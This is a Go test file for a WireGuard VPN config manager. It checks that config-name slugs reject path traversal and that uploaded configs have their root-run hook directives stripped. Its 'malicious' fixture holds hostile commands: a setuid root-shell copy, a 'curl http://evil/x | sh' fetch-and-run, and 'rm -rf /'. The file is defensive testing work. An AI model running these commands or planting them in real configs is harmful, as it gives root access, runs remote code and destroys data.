package main

import (
	"strings"
	"testing"
)

// TestVPNSlugRejectsTraversal is the guard on every filesystem operation the VPN config
// endpoints perform. A slug that escapes the config directory would let an admin-level
// bug read, overwrite or delete arbitrary files as the service user.
func TestVPNSlugRejectsTraversal(t *testing.T) {
	cases := []struct {
		name  string
		input string
		valid bool
	}{
		{"plain name", "proton-nl", true},
		{"with digits and dots", "proton.nl.01", true},
		{"underscores", "my_config", true},
		{"spaces become dashes", "my config", true},

		{"parent traversal", "../evil", false},
		{"deep traversal", "../../etc/sudoers.d/x", false},
		{"url-encoded traversal", "..%2fevil", false},
		// Path separators are STRIPPED, not rejected: "/etc/passwd" flattens to the
		// harmless single segment "etcpasswd" inside the config directory. Containment
		// is the invariant, and it is asserted below for every accepted slug.
		{"absolute path flattens to a contained name", "/etc/passwd", true},
		{"leading dot (hidden file)", ".hidden", false},
		{"bare dot", ".", false},
		{"double dot", "..", false},
		{"the reserved live-config name", "wg0-vpntorrent", false},
		{"empty", "", false},
		{"only separators", "///", false},
		{"null byte", "conf\x00.conf", true}, // the null is stripped, leaving "conf"
		{"newline injection", "conf\nEndpoint=evil", true},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			slug := vpnSanitizeSlug(tc.input)
			got := vpnValidSlug(slug)
			if got != tc.valid {
				t.Fatalf("vpnSanitizeSlug(%q) = %q; vpnValidSlug = %v, want %v", tc.input, slug, got, tc.valid)
			}
			if !got {
				return
			}
			// Whatever survives must be a single, contained path segment.
			if strings.ContainsAny(slug, `/\`) {
				t.Errorf("slug %q contains a path separator", slug)
			}
			if strings.Contains(slug, "..") {
				t.Errorf("slug %q contains a parent reference", slug)
			}
			if strings.HasPrefix(slug, ".") {
				t.Errorf("slug %q is a hidden file", slug)
			}
		})
	}
}

func TestVPNSlugLengthAndUnicode(t *testing.T) {
	t.Run("a 100-character name is truncated to the cap and stays valid", func(t *testing.T) {
		slug := vpnSanitizeSlug(strings.Repeat("a", 100))
		if len(slug) != 64 {
			t.Fatalf("len = %d, want 64", len(slug))
		}
		if !vpnValidSlug(slug) {
			t.Fatal("a truncated name should still be valid")
		}
	})

	t.Run("unicode is stripped to the safe ASCII subset", func(t *testing.T) {
		slug := vpnSanitizeSlug("配置-日本")
		// Only the ASCII dash survives, and a bare "-" is a fine slug.
		if strings.ContainsAny(slug, "配置日本") {
			t.Fatalf("unicode survived sanitisation: %q", slug)
		}
	})

	t.Run("unicode that leaves nothing is rejected", func(t *testing.T) {
		if vpnValidSlug(vpnSanitizeSlug("日本語")) {
			t.Fatal("a name that sanitises to empty must be rejected")
		}
	})

	t.Run("emoji and control characters are stripped", func(t *testing.T) {
		slug := vpnSanitizeSlug("vpn\t\r\n🎬us")
		if slug != "vpnus" {
			t.Fatalf("slug = %q, want %q", slug, "vpnus")
		}
	})

	t.Run("a trailing .conf is not doubled", func(t *testing.T) {
		if got := vpnSanitizeSlug("proton.conf"); got != "proton" {
			t.Fatalf("slug = %q, want %q", got, "proton")
		}
	})
}

// TestVPNSanitizeConf is privilege-contract layer 1: the config directory is owned by
// the SERVICE user, so the service user controls the bytes root's wg-quick parses.
// wg-quick runs PostUp/PostDown/PreUp/PreDown as root shell commands.
func TestVPNSanitizeConf(t *testing.T) {
	const malicious = `[Interface]
PrivateKey = aaaa
Address = 10.2.0.2/32
DNS = 10.2.0.1
PostUp = cp /bin/sh /tmp/rootsh; chmod 4755 /tmp/rootsh
PreUp = curl http://evil/x | sh
Table = off
SaveConfig = true

[Peer]
PublicKey = bbbb
Endpoint = 1.2.3.4:51820
AllowedIPs = 0.0.0.0/0
PostDown = rm -rf /
`
	clean, stripped := vpnSanitizeConf(malicious)

	for _, bad := range []string{"PostUp", "PreUp", "PostDown", "Table", "SaveConfig", "DNS",
		"rootsh", "curl http://evil", "rm -rf /"} {
		if strings.Contains(clean, bad) {
			t.Errorf("sanitised config still contains %q:\n%s", bad, clean)
		}
	}

	// The parts that make it a working tunnel must survive.
	for _, keep := range []string{"[Interface]", "PrivateKey = aaaa", "Address = 10.2.0.2/32",
		"[Peer]", "PublicKey = bbbb", "Endpoint = 1.2.3.4:51820", "AllowedIPs = 0.0.0.0/0"} {
		if !strings.Contains(clean, keep) {
			t.Errorf("sanitisation removed a required line %q:\n%s", keep, clean)
		}
	}

	want := map[string]bool{"dns": true, "postup": true, "preup": true,
		"table": true, "saveconfig": true, "postdown": true}
	for _, s := range stripped {
		if !want[s] {
			t.Errorf("reported stripping an unexpected directive %q", s)
		}
		delete(want, s)
	}
	if len(want) != 0 {
		t.Errorf("these dangerous directives were removed but not REPORTED to the user: %v", want)
	}
}

func TestVPNSanitizeConfLeavesCleanConfigsAlone(t *testing.T) {
	const clean = `[Interface]
PrivateKey = aaaa
Address = 10.2.0.2/32

[Peer]
PublicKey = bbbb
Endpoint = 1.2.3.4:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
`
	got, stripped := vpnSanitizeConf(clean)
	if len(stripped) != 0 {
		t.Errorf("stripped %v from a clean config", stripped)
	}
	if strings.TrimSpace(got) != strings.TrimSpace(clean) {
		t.Errorf("a clean config was modified:\n%s", got)
	}
}

// A value that merely CONTAINS a directive name must not be stripped.
func TestVPNSanitizeConfDoesNotOverMatch(t *testing.T) {
	const conf = `[Interface]
PrivateKey = postupkeymaterialnotadirective
Address = 10.2.0.2/32

[Peer]
PublicKey = bbbb
Endpoint = dns-server.example.com:51820
`
	got, stripped := vpnSanitizeConf(conf)
	if len(stripped) != 0 {
		t.Fatalf("stripped %v from a config with no directives", stripped)
	}
	if !strings.Contains(got, "postupkeymaterialnotadirective") {
		t.Error("stripped a PrivateKey whose VALUE contains a directive name")
	}
	if !strings.Contains(got, "dns-server.example.com") {
		t.Error("stripped an Endpoint whose value contains 'dns'")
	}
}

func TestVPNIsWireGuardConf(t *testing.T) {
	valid := "[Interface]\nPrivateKey = x\n[Peer]\nEndpoint = 1.2.3.4:1"
	if !vpnIsWireGuardConf(valid) {
		t.Error("a valid config was rejected")
	}
	for _, bad := range []string{"", "hello world", "[Interface]\nPrivateKey = x", "[Peer]\nEndpoint = x"} {
		if vpnIsWireGuardConf(bad) {
			t.Errorf("accepted a non-WireGuard payload: %q", bad)
		}
	}
}

func TestVPNParseEndpoint(t *testing.T) {
	conf := "[Peer]\nEndpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0"
	if got := vpnParseEndpoint(conf); got != "203.0.113.7:51820" {
		t.Errorf("vpnParseEndpoint = %q", got)
	}
	if got := vpnParseEndpoint("[Peer]\nAllowedIPs = 0.0.0.0/0"); got != "" {
		t.Errorf("vpnParseEndpoint with no endpoint = %q, want empty", got)
	}
}
